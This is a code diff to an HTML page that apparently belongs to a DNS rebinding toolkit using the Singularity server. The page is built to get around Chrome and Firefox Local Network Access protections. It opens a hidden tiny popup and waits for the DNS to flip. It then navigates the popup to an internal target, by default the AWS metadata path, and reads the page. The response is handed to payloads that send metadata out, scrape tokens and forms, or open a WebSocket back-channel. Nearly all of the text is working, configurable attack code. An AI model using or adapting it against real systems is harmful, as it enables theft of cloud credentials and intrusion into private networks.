@@ -1,24 +1,24 @@
 <!doctype html>
 <html lang="en">
 <!--
-    LNA Navigation Bypass — DNS rebinding via window.open + navigation.
+    LNA Navigation Bypass — DNS rebinding via Singularity + window.open.
 
-    Chrome and Firefox ship Local Network Access (LNA): even a same-origin
-    fetch is blocked if the resolved IP is more local than the requesting
-    origin. fetch() is dead for rebinding.
+    Integrates with Singularity's DNS server using the same subdomain
+    encoding and CONFIG as amaze.html. Uses window.open + navigation to
+    bypass Chrome/Firefox Local Network Access (LNA) restrictions.
 
-    But top-level navigations are NOT guarded by LNA. This page:
-      1. Opens a popup via window.open (same origin, attacker IP)
-      2. Polls with fetch("/") until an LNA error fires (= DNS rebind done)
-      3. Navigates the popup to targetPath on the rebound origin
-      4. Reads the popup's document via the same-origin window reference
-      5. Dispatches the response body to the configured payload (e.g. DOM scraper)
+    Flow:
+      1. Page redirects itself to the encoded attack subdomain
+         (s-ATTACKERIP-TARGETIP-RAND-STRATEGY-e.domain:port)
+      2. On click, opens a popup on the same origin (now the attack subdomain)
+      3. Polls fetch("/") — succeeds while DNS points to attacker IP
+      4. Singularity flips DNS to target IP → LNA blocks fetch → TypeError
+      5. Navigates popup to CONFIG.targetPath via top-level navigation (not
+         blocked by LNA)
+      6. Reads popup.document.documentElement.outerHTML (same-origin)
+      7. Dispatches response body to the configured payload
 
-    Uses the same CONFIG pattern as amaze.html and the same payload scripts
-    from payloads/. Can run with or without the Singularity server — any
-    static HTTP server works, as long as payloads/ is served alongside.
-
-    See WIKI.md for the full write-up.
+    See WIKI.md for full write-up.
 -->
 <head>
     <title>LNA Bypass</title>
@@ -62,11 +62,18 @@
 </head>
 <body>
     <h3>LNA Navigation Bypass</h3>
-    <p class="dim">DNS rebinding via window.open — bypasses Chrome/Firefox Local Network Access.</p>
+    <p class="dim">DNS rebinding via Singularity + window.open — bypasses LNA.</p>
 
     <p id="msg">Click to start</p>
 
     <div id="status"></div>
+
+    <!--
+      delayDOMLoad: /delaydomload is a Singularity server endpoint that hangs
+      the connection forever. Keeps headless browsers alive past document.load.
+      Removed at runtime if CONFIG.delayDOMLoad is false.
+    -->
+    <iframe id="delaydomloadframe" src="/delaydomload" style="display: none"></iframe>
 
     <!-- payload.js provides: Registry, sooFetch, httpHeaderstoText -->
     <script src="payload.js"></script>
@@ -78,7 +85,7 @@
     <script>
     // ============================================================
     //  CONFIG  —  edit these to retarget the attack
-    //  Same fields as amaze.html where applicable.
+    //  Same fields as amaze.html.
     // ============================================================
     const CONFIG = {
         // Attacker infrastructure
@@ -90,30 +97,41 @@
         targetPort:          '80',
         targetPath:          '/latest/meta-data',
 
+        // Rebinding — see WIKI.md "Strategy gotchas" before changing
+        rebindingStrategy:   'fs',     // 'fs' | 'rr' | 'rd' | 'ma'
+        interval:            '20',     // seconds between fetch polls
+
         // Payload — must match a key registered in payloads/*.js
-        //   'AWS Metadata Exfil'  → POST rebound response to EXFILTRATION_URL
-        //                           in payloads/aws-metadata-exfil.js. One-shot.
-        //   'LNA DOM Scraper'    → scrape DOM, forms, tokens, inline scripts from
-        //                           initial page + crawl same-origin links. Exfils
-        //                           structured JSON. Purpose-built for this bypass.
-        //   'Hook and Control'    → open WebSocket back-channel (needs Singularity).
-        attackPayload:       'LNA DOM Scraper',
-
-        // Polling interval (ms) while waiting for DNS cache to expire
-        pollInterval:        2000,
-
-        // How long to wait (ms) for popup navigation to complete before reading
-        navigationWait:      2000,
+        attackPayload:       'AWS Metadata Exfil',
 
         // Misc
+        indexToken:          '<!--thisismytesttoken-->',
         wsProxyPort:         3129,
+        flushDns:            false,
+        delayDOMLoad:        true,
         hideActivity:        false,
     };
 
     // ============================================================
+    //  Singularity subdomain URL builder (same as amaze.html)
+    // ============================================================
+    const HOST_URL_TEMPLATE = "http://s-%1-%2-%3-%4-e.%5:%6/%7";
 
-    if (CONFIG.hideActivity) document.body.style.display = 'none';
+    const buildAttackUrl = (path) => HOST_URL_TEMPLATE
+        .replace("%1", CONFIG.attackHostIPAddress)
+        .replace("%2", CONFIG.targetHostIPAddress.replace(/-/g, '--'))
+        .replace("%3", Math.floor(Math.random() * 2 ** 32))
+        .replace("%4", CONFIG.rebindingStrategy)
+        .replace("%5", CONFIG.attackHostDomain)
+        .replace("%6", CONFIG.targetPort)
+        .replace("%7", path || '');
 
+    const joinUrl = (base, path) =>
+        base.replace(/\/+$/, '') + '/' + path.replace(/^\/+/, '');
+
+    // ============================================================
+    //  UI helpers
+    // ============================================================
     const log = (line) => {
         const el = document.getElementById('status');
         const ts = new Date().toISOString().slice(11, 19);
@@ -121,124 +139,166 @@
         el.scrollTop = el.scrollHeight;
     };
 
-    const joinUrl = (base, path) =>
-        base.replace(/\/+$/, '') + '/' + path.replace(/^\/+/, '');
-
     const msgEl = document.getElementById('msg');
 
-    if (window.name === "lna_popup") {
-        msgEl.innerText = "Popup: waiting for navigation...";
-        msgEl.className = "waiting";
+    // ============================================================
+    //  delayDOMLoad / hideActivity
+    // ============================================================
+    if (CONFIG.delayDOMLoad !== true) {
+        const d = document.getElementById('delaydomloadframe');
+        d.parentNode.removeChild(d);
+    }
+    if (CONFIG.hideActivity) document.body.style.display = 'none';
+
+    // ============================================================
+    //  Attack subdomain redirect
+    //
+    //  For same-origin popup access to work, this page must be
+    //  loaded on the Singularity attack subdomain. If it isn't,
+    //  redirect there. The encoded subdomain tells Singularity's
+    //  DNS which IPs to serve (attacker first, then target).
+    // ============================================================
+    const ATTACK_SUBDOMAIN_RE = /^s-.+-e\./;
+    const onAttackSubdomain = ATTACK_SUBDOMAIN_RE.test(window.location.hostname);
+
+    if (!onAttackSubdomain) {
+        const redirectUrl = buildAttackUrl('lna-bypass.html');
+        log('Redirecting to attack subdomain...');
+        log(redirectUrl);
+        window.location = redirectUrl;
     }
 
-    msgEl.onclick = async () => {
-        if (window.name === "lna_popup") return;
-        msgEl.onclick = null;
-        msgEl.className = "waiting";
-        msgEl.innerText = "Waiting for DNS rebind (~60s)...";
-
+    // ============================================================
+    //  Attack flow (runs only on the attack subdomain)
+    // ============================================================
+    if (onAttackSubdomain) {
+        log('On attack subdomain: ' + window.location.hostname);
         log('Target: ' + CONFIG.targetHostIPAddress + ':' + CONFIG.targetPort + CONFIG.targetPath);
+        log('Strategy: ' + CONFIG.rebindingStrategy + ', interval: ' + CONFIG.interval + 's');
         log('Payload: ' + CONFIG.attackPayload);
+        log('Click to start the attack.');
 
-        // Step 1: open popup on same origin (attacker IP right now)
-        const popup = window.open(
-            "/",
-            "lna_popup",
-            "width=1,height=1,top=9999,left=9999"
-        );
+        msgEl.onclick = async () => {
+            msgEl.onclick = null;
+            msgEl.className = 'waiting';
+            msgEl.innerText = 'Waiting for DNS rebind...';
 
-        if (!popup) {
-            log("ERROR: popup blocked. Needs user gesture or allow-popups.");
-            msgEl.innerText = "Popup blocked — try again";
-            msgEl.className = "";
-            msgEl.onclick = arguments.callee;
-            return;
-        }
+            // Step 1: open popup on same origin (attacker IP right now)
+            const popup = window.open(
+                '/',
+                'lna_popup',
+                'width=1,height=1,top=9999,left=9999'
+            );
 
-        log("Popup opened on attacker origin");
-        log("Polling fetch('/') to detect LNA block (DNS rebind)...");
-
-        // Step 2: poll fetch until LNA kills it
-        let rebindDetected = false;
-        let polls = 0;
-
-        while (!rebindDetected) {
-            try {
-                await fetch("/", { cache: "reload" });
-                polls++;
-                if (polls % 10 === 0) log('Still on attacker IP (' + polls + ' polls)...');
-            } catch (e) {
-                rebindDetected = true;
-                log('LNA block after ' + polls + ' polls — rebind detected!');
-            }
-            if (!rebindDetected) {
-                await new Promise(r => setTimeout(r, CONFIG.pollInterval));
-            }
-        }
-
-        // Step 3: navigate popup to targetPath on the rebound origin.
-        // Top-level navigation is NOT guarded by LNA.
-        const navPath = joinUrl("/", CONFIG.targetPath);
-        log('Navigating popup to ' + navPath + ' via top-level navigation...');
-        popup.location = navPath;
-
-        msgEl.innerText = "Rebind successful — reading target...";
-        msgEl.className = "success";
-
-        // Step 4: wait for navigation, then read the popup's DOM
-        const readPopup = (attempt) => {
-            try {
-                const doc = popup.document;
-                const body = doc.documentElement.outerHTML;
-                if (!body || body.length === 0) throw new Error('empty response');
-                return body;
-            } catch (e) {
-                if (attempt > 0) throw e;
-                return null;
-            }
-        };
-
-        await new Promise(r => setTimeout(r, CONFIG.navigationWait));
-
-        let body = null;
-        try {
-            body = readPopup(0);
-            if (!body) {
-                log("First read empty, retrying in 3s...");
-                await new Promise(r => setTimeout(r, 3000));
-                body = readPopup(1);
-            }
-        } catch (e) {
-            log('Read failed: ' + e);
-            log("Retrying in 5s...");
-            await new Promise(r => setTimeout(r, 5000));
-            try {
-                body = readPopup(1);
-            } catch (e2) {
-                log('Retry failed: ' + e2);
-                log("Target may require more load time or rebind timing was off.");
+            if (!popup) {
+                log('ERROR: popup blocked. Needs user gesture or allow-popups.');
+                msgEl.innerText = 'Popup blocked — try again';
+                msgEl.className = '';
+                msgEl.onclick = arguments.callee;
                 return;
             }
-        }
 
-        log('Read ' + body.length + ' bytes from rebound target');
-        console.log('[+] rebind success — response:\n' + body);
+            log('Popup opened on attacker origin');
 
-        // Step 5: dispatch to the configured payload.
-        // Expose the popup reference so payloads (e.g. LNA DOM Scraper)
-        // can navigate it to crawl additional pages.
-        window.__lnaPopup = popup;
+            // Step 2: poll fetch("/") to detect when Singularity flips DNS
+            // While DNS points to attacker IP, fetch succeeds.
+            // After DNS flips to target IP, LNA blocks fetch → TypeError.
+            log('Polling fetch("/") every ' + CONFIG.interval + 's to detect LNA block...');
 
-        const payloadObj = Registry[CONFIG.attackPayload];
-        if (payloadObj) {
-            log('Dispatching to payload: ' + CONFIG.attackPayload);
-            payloadObj.attack(null, document.cookie, body, CONFIG.wsProxyPort);
-        } else {
-            log("WARNING: payload '" + CONFIG.attackPayload + "' not found in Registry");
-            log('Available: ' + Object.keys(Registry).join(', '));
-            log("Response logged to console only.");
-        }
-    };
+            const pollMs = parseInt(CONFIG.interval) * 1000;
+            let rebindDetected = false;
+            let polls = 0;
+
+            while (!rebindDetected) {
+                try {
+                    const resp = await fetch('/', { cache: 'reload' });
+                    const text = await resp.text();
+
+                    // Double-check: if indexToken is present, we're still
+                    // hitting the attacker's Singularity server
+                    if (CONFIG.indexToken && !text.includes(CONFIG.indexToken)) {
+                        log('Response lacks indexToken — possible early rebind');
+                        rebindDetected = true;
+                        break;
+                    }
+
+                    polls++;
+                    if (polls % 5 === 0) log('Still on attacker IP (' + polls + ' polls)...');
+                } catch (e) {
+                    rebindDetected = true;
+                    log('LNA block after ' + polls + ' polls — rebind detected!');
+                }
+                if (!rebindDetected) {
+                    await new Promise(r => setTimeout(r, pollMs));
+                }
+            }
+
+            // Step 3: navigate popup to targetPath on the rebound origin.
+            // Top-level navigation is NOT guarded by LNA.
+            const navPath = joinUrl('/', CONFIG.targetPath);
+            log('Navigating popup to ' + navPath + ' via top-level navigation...');
+            popup.location = navPath;
+
+            msgEl.innerText = 'Rebind successful — reading target...';
+            msgEl.className = 'success';
+
+            // Step 4: wait for navigation to complete, then read popup DOM.
+            // Same-origin read works because the browser still considers the
+            // popup same-origin (same scheme+host+port as the opener).
+            const readPopup = (attempt) => {
+                try {
+                    const doc = popup.document;
+                    const body = doc.documentElement.outerHTML;
+                    if (!body || body.length === 0) throw new Error('empty response');
+                    return body;
+                } catch (e) {
+                    if (attempt > 0) throw e;
+                    return null;
+                }
+            };
+
+            await new Promise(r => setTimeout(r, 2000));
+
+            let body = null;
+            try {
+                body = readPopup(0);
+                if (!body) {
+                    log('First read empty, retrying in 3s...');
+                    await new Promise(r => setTimeout(r, 3000));
+                    body = readPopup(1);
+                }
+            } catch (e) {
+                log('Read failed: ' + e);
+                log('Retrying in 5s...');
+                await new Promise(r => setTimeout(r, 5000));
+                try {
+                    body = readPopup(1);
+                } catch (e2) {
+                    log('Retry failed: ' + e2);
+                    log('Target may require more load time or rebind timing was off.');
+                    return;
+                }
+            }
+
+            log('Read ' + body.length + ' bytes from rebound target');
+            console.log('[+] rebind success — response:\n' + body);
+
+            // Step 5: dispatch to the configured payload.
+            // Expose the popup reference so payloads (e.g. LNA DOM Scraper)
+            // can navigate it to crawl additional pages.
+            window.__lnaPopup = popup;
+
+            const payloadObj = Registry[CONFIG.attackPayload];
+            if (payloadObj) {
+                log('Dispatching to payload: ' + CONFIG.attackPayload);
+                payloadObj.attack(null, document.cookie, body, CONFIG.wsProxyPort);
+            } else {
+                log("WARNING: payload '" + CONFIG.attackPayload + "' not found in Registry");
+                log('Available: ' + Object.keys(Registry).join(', '));
+                log('Response logged to console only.');
+            }
+        };
+    }
     </script>
 </body>
 </html>
